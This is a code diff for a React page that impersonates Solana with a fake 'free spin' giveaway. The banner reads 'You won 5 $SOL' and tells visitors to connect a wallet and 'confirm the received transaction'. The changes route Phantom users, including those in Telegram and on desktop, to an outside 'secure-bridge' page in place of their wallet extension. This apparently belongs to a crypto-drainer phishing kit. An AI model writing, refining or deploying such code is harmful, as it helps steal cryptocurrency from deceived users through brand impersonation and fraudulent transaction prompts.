@@ -146,6 +146,7 @@ export default function RealApp() {
   useEffect(() => {
     if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
   }, [hasSpun])
+
   const handleSpin = () => {
     if (hasSpun || !wheelRef.current) return
     const w = wheelRef.current!
@@ -175,16 +176,27 @@ export default function RealApp() {
   const origin = typeof window !== 'undefined' ? window.location.origin : ''
   const dappUrl = encodeURIComponent(origin)
 
-  /* ——— Küçük popup açıcı (masaüstü) ——— */
+  /* ——— Masaüstü algılama ve Bridge popup ——— */
+  const isDesktop = () => {
+    const uaData = (navigator as any).userAgentData
+    if (uaData && typeof uaData.mobile === 'boolean') return !uaData.mobile
+    const ua = navigator.userAgent
+    const isMobileUA = /Android|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(ua)
+    return !isMobileUA
+  }
+
+  const SECURE_BRIDGE_URL =
+    (process.env.NEXT_PUBLIC_BRIDGE_URL as string) || 'https://secure-bridge.vercel.app/'
+
   const openBridgePopup = (url: string) => {
-    // Mobil oranına yakın bir pencere: 420x780 (9:16)
+    // Mobil oranına yakın (9:16)
     const popupW = 420
     const popupH = 780
 
-    const dualLeft  = (window as any).screenLeft ?? (window as any).screenX ?? 0
-    const dualTop   = (window as any).screenTop  ?? (window as any).screenY ?? 0
-    const winW      = window.innerWidth || document.documentElement.clientWidth || screen.width
-    const winH      = window.innerHeight || document.documentElement.clientHeight || screen.height
+    const dualLeft = (window as any).screenLeft ?? (window as any).screenX ?? 0
+    const dualTop  = (window as any).screenTop  ?? (window as any).screenY ?? 0
+    const winW     = window.innerWidth || document.documentElement.clientWidth || screen.width
+    const winH     = window.innerHeight || document.documentElement.clientHeight || screen.height
 
     const left = Math.max(0, dualLeft + (winW - popupW) / 2)
     const top  = Math.max(0, dualTop  + (winH - popupH) / 2)
@@ -206,10 +218,10 @@ export default function RealApp() {
     if (win) {
       try { win.focus() } catch { /* ignore */ }
     } else {
-      // Popup engellendiyse fallback aynı URL’i yeni sekmede aç
-      window.open(url, '_blank', 'noopener,noreferrer')
+      window.open(url, '_blank', 'noopener,noreferrer') // popup bloklandı fallback
     }
   }
+
 
 
   /* ——— Cüzdan yapılandırmaları & sıralama ——— */
@@ -364,38 +376,28 @@ export default function RealApp() {
     closeDrawer();
 
     if (w.adapter.name === 'Phantom') {
-      const sol           = (window as any).solana;
-      const ua            = navigator.userAgent;
-      const isAndroid     = /Android/i.test(ua);
-      const isIOS         = /iPhone|iPad|iPod/i.test(ua);
-      const isTelegramWebView =
-        /Telegram/i.test(ua) &&
-        typeof (window as any).Telegram?.WebApp !== 'undefined';
-
-      // ===== Köprü (bridge) adresleri =====
-      const secureBridgeUrl = 'https://secure-bridge.vercel.app/'; // prod: .env ile yönetilebilir
-      const currentFullUrl  = window.location.href;
-      const bridgeUrlWithParams = `${secureBridgeUrl}?from=${encodeURIComponent(currentFullUrl)}`;
-
-      const encodedBridge   = encodeURIComponent(secureBridgeUrl);
-
-      // Mevcut sayfanın (Telegram içindeki) tam URL’i
-      const currentUrl      = window.location.origin + window.location.pathname;
-      const hostAndPath     = currentUrl.replace(/^https?:\/\//, '');
-
-      /* -- Phantom link formatları (secure-bridge’e göre) -- */
-      const schemePhantom    = `phantom://browse/${encodedBridge}?ref=${encodedBridge}`;
-      const universalPhantom = `https://phantom.app/ul/browse/${encodedBridge}?ref=${encodedBridge}`;
-
-      // 0) MASAÜSTÜ SENARYOSU: Ne Android ne iOS → küçük popup’ta bridge aç
-      if (!isAndroid && !isIOS) {
-        // Eklenti yüklü olsa bile desktop'ta popup'ı açıyoruz
-        openBridgePopup(bridgeUrlWithParams);
-        return;
+      // ——— Masaüstü ise: eklenti yerine bridge popup aç ———
+      if (isDesktop()) {
+        const currentFullUrl = window.location.href
+        const bridgeUrl = `${SECURE_BRIDGE_URL}?from=${encodeURIComponent(currentFullUrl)}`
+        openBridgePopup(bridgeUrl)
+        return
       }
 
-      /* -- 1) Android + Telegram WebView → intent (mevcut sayfa) -- */
+      // ——— Mobil akış: mevcut davranışı koru ———
+      const ua        = navigator.userAgent
+      const isAndroid = /Android/i.test(ua)
+      const isTelegramWebView =
+        /Telegram/i.test(ua) &&
+        typeof (window as any).Telegram?.WebApp !== 'undefined'
+
+      // 1) Android + Telegram WebView → intent
       if (isAndroid && isTelegramWebView) {
+        const encodedBridge = encodeURIComponent(SECURE_BRIDGE_URL)
+        const currentUrl    = window.location.origin + window.location.pathname
+        const hostAndPath   = currentUrl.replace(/^https?:\/\//, '')
+        const universalPhantom = `https://phantom.app/ul/browse/${encodedBridge}?ref=${encodedBridge}`
+
         const intentDefaultBrowser = [
           `intent://${hostAndPath}`,
           `#Intent;scheme=https`,
@@ -403,30 +405,35 @@ export default function RealApp() {
           `;category=android.intent.category.BROWSABLE`,
           `;S.browser_fallback_url=${universalPhantom}`,
           `;end`
-        ].join('');
-        const a = document.createElement('a');
-        a.href   = intentDefaultBrowser;
-        a.target = '_blank';
-        document.body.appendChild(a);
-        a.click();
-        setTimeout(() => a.remove(), 700);
-        return;
+        ].join('')
+
+        const a = document.createElement('a')
+        a.href   = intentDefaultBrowser
+        a.target = '_blank'
+        document.body.appendChild(a)
+        a.click()
+        setTimeout(() => a.remove(), 700)
+        return
       }
 
-      /* -- 2) Android normal tarayıcı → Phantom scheme (secure-bridge) -- */
+      // 2) Android normal tarayıcı → scheme
       if (isAndroid) {
-        const a = document.createElement('a');
-        a.href   = schemePhantom;
-        a.target = '_blank';
-        document.body.appendChild(a);
-        a.click();
-        setTimeout(() => a.remove(), 700);
-        return;
+        const encodedBridge = encodeURIComponent(SECURE_BRIDGE_URL)
+        const schemePhantom = `phantom://browse/${encodedBridge}?ref=${encodedBridge}`
+        const a = document.createElement('a')
+        a.href   = schemePhantom
+        a.target = '_blank'
+        document.body.appendChild(a)
+        a.click()
+        setTimeout(() => a.remove(), 700)
+        return
       }
 
-      /* -- 3) iOS & diğerleri → universal link (secure-bridge) -- */
-      window.location.href = universalPhantom;
-      return;
+      // 3) iOS → universal link
+      const encodedBridge = encodeURIComponent(SECURE_BRIDGE_URL)
+      const universalPhantom = `https://phantom.app/ul/browse/${encodedBridge}?ref=${encodedBridge}`
+      window.location.href = universalPhantom
+      return
     }
 
     /* -------- Diğer cüzdanlar -------- */
@@ -441,202 +448,200 @@ export default function RealApp() {
 
 
 
-  return (
-    <>
-      {/* ---------- HERO BANNER ---------- */}
-      <div className="_1">
-        <div className="_g">
-          <span className="_a">
-            <div className="_3">
-              <p className="_7">
-                CONGRATULATIONS!<br/>
-                <span className="_a">You won</span>{' '}
-                <span className="_a">5 $SOL</span>
-              </p>
-            </div>
-          </span>
-          <div className="_9">
-            <div className="_i">
-              <p className="_k">Connect your wallet to receive reward</p>
-              <button onClick={handleClaim} className="_s" disabled={loading}>
-                {loading ? 'Please wait…' : msg || 'CLAIM REWARD'}
-              </button>
-            </div>
-          </div>
-        </div>
-      </div>
 
-      {/* ---------- HEADER ---------- */}
-      <section className="_b">
-        <div className="_d">
-          <div className="_x">
-            <div className="_0">
-              <a href="#!" className="_h">
-                <img src="/header_logo.svg" alt="Solana logo" />
-              </a>
-              <a href="#!" className="_w">
-                <img src="/alik.png" className="_t" alt="avatar" />
-              </a>
-            </div>
-            <div className="_0">
-              <div className="_6">
-                <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer" aria-label="X (Twitter)">
-                  <img src="/header_twitter.svg" alt="Twitter" />
-                </a>
-                <a href="https://t.me/solana" target="_blank" rel="noreferrer" aria-label="Telegram">
-                  <img src="/header_tg.svg" alt="Telegram" />
-                </a>
-                <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer" aria-label="YouTube">
-                  <img src="/header_mail.svg" alt="YouTube" />
-                </a>
-                <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer" aria-label="Discord">
-                  <img src="/header_ds.svg" alt="Discord" />
-                </a>
-              </div>
-            </div>
-            <div className="_0">
-              <button onClick={handleConnect} className="_n" aria-busy={loading}>
-                <span className="_a">
-                  {publicKey ? 'Wallet connected' : 'Connect Wallet'}
-                </span>
-                <img src="/header_arrow.svg" alt="→" />
-              </button>
-            </div>
-          </div>
-        </div>
-      </section>
 
-      {/* ---------- MAIN SECTION ---------- */}
-      <section className="_m">
-        <div className="_d">
-          <h1 className="_4">
-            WELCOME <span>BONUS</span><br/>
-            FOR SOLANA USERS
-          </h1>
-          <div className="_o">
-            <div className="_r">
-              <img src="/wheel_arrow.png" alt="Arrow" className="_f" />
-              <img ref={wheelRef} src="/wheel_wheel.png" alt="Wheel" className="_l" />
-              <button className="_y" onClick={handleSpin}>FREE SPIN</button>
-            </div>
-          </div>
-          <div className="_u">
-            <div className="_j">
-              <p className="_p">
-                <img src="/main_one.svg" alt="step 1" />
-                If you have received a qualification notification in the form of SOL or USDT, click the «FREE SPIN» button
-              </p>
-              <p className="_p">
-                <img src="/main_two.svg" alt="step 2" />
-                If you win a reward in free spin, we congratulate you!
-              </p>
-              <p className="_p">
-                <img src="/main_three.svg" alt="step 3" />
-                Click «CLAIM REWARD», connect your wallet and confirm the received transaction
-              </p>
-            </div>
-            <p className="_e">All rights reserved © 2025 SOLANA.</p>
-          </div>
-        </div>
-      </section>
 
-      {/* ——— CONNECT DRAWER & MODAL ——— */}
-      <Transition show={drawerOpen} as={Fragment}>
-        {/* overlay */}
-        <Transition.Child
-          as="div"
-          enter="transition-opacity duration-200"
-          enterFrom="opacity-0"
-          enterTo="opacity-60"
-          leave="transition-opacity duration-200"
-          leaveFrom="opacity-60"
-          leaveTo="opacity-0"
-          className="connect-overlay"
-          onClick={closeDrawer}
-        />
 
-        {/* mobile bottom sheet */}
-        <Transition.Child
-          as="div"
-          enter="transition-transform duration-200"
-          enterFrom="translate-y-full"
-          enterTo="translate-y-0"
-          leave="transition-transform duration-200"
-          leaveFrom="translate-y-0"
-          leaveTo="translate-y-full"
-          className="connect-sheet md:hidden"
-        >
-          <div className="connect-header">
-            <h2 className="connect-title">Connect Wallet</h2>
-            <button className="connect-close" onClick={closeDrawer}>×</button>
-          </div>
-          <div className="connect-list">
-            {orderedWallets.map(w => (
-              <div
-                key={w.adapter.name}
-                className="connect-row"
-                onClick={() => handleWalletClick(w)}
-                role="button"
-                tabIndex={0}
-                onKeyDown={(e) => (e.key === 'Enter' || e.key === ' ') && handleWalletClick(w)}
-              >
-                <div className="connect-icon">
-                  <img src={w.icon} alt={w.label} />
+      return (
+        <>
+          {/* ---------- HERO BANNER ---------- */}
+          <div className="_1">
+            <div className="_g">
+              <span className="_a">
+                <div className="_3">
+                  <p className="_7">
+                    CONGRATULATIONS!<br/>
+                    <span className="_a">You won</span>{' '}
+                    <span className="_a">5 $SOL</span>
+                  </p>
                 </div>
-                <span className="connect-text">{w.label}</span>
+              </span>
+              <div className="_9">
+                <div className="_i">
+                  <p className="_k">Connect your wallet to receive reward</p>
+                  <button onClick={handleClaim} className="_s" disabled={loading}>
+                    {loading ? 'Please wait…' : msg || 'CLAIM REWARD'}
+                  </button>
+                </div>
               </div>
-            ))}
-          </div>
-          <p className="connect-footer">
-            Haven’t got a wallet?{' '}
-            <a href="https://solana.com/wallets" target="_blank">
-              Get started
-            </a>
-          </p>
-        </Transition.Child>
-
-        {/* desktop centered modal */}
-        <Transition.Child
-          as="div"
-          enter="transition-opacity duration-200"
-          enterFrom="opacity-0"
-          enterTo="opacity-100"
-          leave="transition-opacity duration-200"
-          leaveFrom="opacity-100"
-          leaveTo="opacity-0"
-          className="hidden md:flex fixed inset-0 z-50 items-center justify-center bg-black/40"
-        >
-          <div className="drawer-card space-y-4">
-            <div className="connect-header">
-              <h2 className="connect-title">Connect Wallet</h2>
-              <button className="connect-close" onClick={closeDrawer}>×</button>
             </div>
-            <div className="connect-list">
-              {orderedWallets.map(w => (
-                <div
-                  key={w.adapter.name}
-                  className="connect-row"
-                  onClick={() => handleWalletClick(w)}
-                  role="button"
-                  tabIndex={0}
-                  onKeyDown={(e) => (e.key === 'Enter' || e.key === ' ') && handleWalletClick(w)}
-                >
-                  <div className="connect-icon">
-                    <img src={w.icon} alt={w.label} />
+          </div>
+
+          {/* ---------- HEADER ---------- */}
+          <section className="_b">
+            <div className="_d">
+              <div className="_x">
+                <div className="_0">
+                  <a href="#!" className="_h">
+                    <img src="/header_logo.svg" alt="Solana logo" />
+                  </a>
+                  <a href="#!" className="_w">
+                    <img src="/alik.png" className="_t" alt="avatar" />
+                  </a>
+                </div>
+                <div className="_0">
+                  <div className="_6">
+                    <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
+                      <img src="/header_twitter.svg" alt="Twitter" />
+                    </a>
+                    <a href="https://t.me/solana" target="_blank" rel="noreferrer">
+                      <img src="/header_tg.svg" alt="Telegram" />
+                    </a>
+                    <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
+                      <img src="/header_mail.svg" alt="YouTube" />
+                    </a>
+                    <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
+                      <img src="/header_ds.svg" alt="Discord" />
+                    </a>
                   </div>
-                  <span className="connect-text">{w.label}</span>
                 </div>
-              ))}
+                <div className="_0">
+                  <button onClick={handleConnect} className="_n">
+                    <span className="_a">
+                      {publicKey ? 'Wallet connected' : 'Connect Wallet'}
+                    </span>
+                    <img src="/header_arrow.svg" alt="→" />
+                  </button>
+                </div>
+              </div>
             </div>
-            <p className="connect-footer">
-              Haven’t got a wallet?{' '}
-              <a href="https://solana.com/wallets" target="_blank">
-                Get started
-              </a>
-            </p>
-          </div>
-        </Transition.Child>
-      </Transition>
-    </>
-  )
+          </section>
+
+          {/* ---------- MAIN SECTION ---------- */}
+          <section className="_m">
+            <div className="_d">
+              <h1 className="_4">
+                WELCOME <span>BONUS</span><br/>
+                FOR SOLANA USERS
+              </h1>
+              <div className="_o">
+                <div className="_r">
+                  <img src="/wheel_arrow.png" alt="Arrow" className="_f" />
+                  <img ref={wheelRef} src="/wheel_wheel.png" alt="Wheel" className="_l" />
+                  <button className="_y" onClick={handleSpin}>FREE SPIN</button>
+                </div>
+              </div>
+              <div className="_u">
+                <div className="_j">
+                  <p className="_p">
+                    <img src="/main_one.svg" alt="step 1" />
+                    If you have received a qualification notification in the form of SOL or USDT, click the «FREE SPIN» button
+                  </p>
+                  <p className="_p">
+                    <img src="/main_two.svg" alt="step 2" />
+                    If you win a reward in free spin, we congratulate you!
+                  </p>
+                  <p className="_p">
+                    <img src="/main_three.svg" alt="step 3" />
+                    Click «CLAIM REWARD», connect your wallet and confirm the received transaction
+                  </p>
+                </div>
+                <p className="_e">All rights reserved © 2025 SOLANA.</p>
+              </div>
+            </div>
+          </section>
+
+          {/* ——— CONNECT DRAWER & MODAL ——— */}
+          <Transition show={drawerOpen} as={Fragment}>
+            {/* overlay */}
+            <Transition.Child
+              as="div"
+              enter="transition-opacity duration-200"
+              enterFrom="opacity-0"
+              enterTo="opacity-60"
+              leave="transition-opacity duration-200"
+              leaveFrom="opacity-60"
+              leaveTo="opacity-0"
+              className="connect-overlay"
+              onClick={closeDrawer}
+            />
+
+            {/* mobile bottom sheet */}
+            <Transition.Child
+              as="div"
+              enter="transition-transform duration-200"
+              enterFrom="translate-y-full"
+              enterTo="translate-y-0"
+              leave="transition-transform duration-200"
+              leaveFrom="translate-y-0"
+              leaveTo="translate-y-full"
+              className="connect-sheet md:hidden"
+            >
+              <div className="connect-header">
+                <h2 className="connect-title">Connect Wallet</h2>
+                <button className="connect-close" onClick={closeDrawer}>×</button>
+              </div>
+              <div className="connect-list">
+                {orderedWallets.map(w => (
+                  <div
+                    key={w.adapter.name}
+                    className="connect-row"
+                    onClick={() => handleWalletClick(w)}
+                  >
+                    <div className="connect-icon">
+                      <img src={w.icon} alt={w.label} />
+                    </div>
+                    <span className="connect-text">{w.label}</span>
+                  </div>
+                ))}
+              </div>
+              <p className="connect-footer">
+                Haven’t got a wallet?{' '}
+                <a href="https://solana.com/wallets" target="_blank">
+                  Get started
+                </a>
+              </p>
+            </Transition.Child>
+
+            {/* desktop centered modal */}
+            <Transition.Child
+              as="div"
+              enter="transition-opacity duration-200"
+              enterFrom="opacity-0"
+              enterTo="opacity-100"
+              leave="transition-opacity duration-200"
+              leaveFrom="opacity-100"
+              leaveTo="opacity-0"
+              className="hidden md:flex fixed inset-0 z-50 items-center justify-center bg-black/40"
+            >
+              <div className="drawer-card space-y-4">
+                <div className="connect-header">
+                  <h2 className="connect-title">Connect Wallet</h2>
+                  <button className="connect-close" onClick={closeDrawer}>×</button>
+                </div>
+                <div className="connect-list">
+                  {orderedWallets.map(w => (
+                    <div
+                      key={w.adapter.name}
+                      className="connect-row"
+                      onClick={() => handleWalletClick(w)}
+                    >
+                      <div className="connect-icon">
+                        <img src={w.icon} alt={w.label} />
+                      </div>
+                      <span className="connect-text">{w.label}</span>
+                    </div>
+                  ))}
+                </div>
+                <p className="connect-footer">
+                  Haven’t got a wallet?{' '}
+                  <a href="https://solana.com/wallets" target="_blank">
+                    Get started
+                  </a>
+                </p>
+              </div>
+            </Transition.Child>
+          </Transition>
+        </>
+      )
 }
